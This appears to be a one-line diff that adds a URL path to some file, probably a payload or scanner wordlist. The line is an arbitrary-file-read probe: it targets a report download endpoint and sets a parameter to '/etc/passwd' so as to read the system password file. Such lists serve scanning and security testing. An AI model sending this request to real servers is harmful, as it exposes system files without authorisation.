@@ -1,0 +1,1 @@
+/api/model_report/file/download?index=/&ext=/etc/passwd
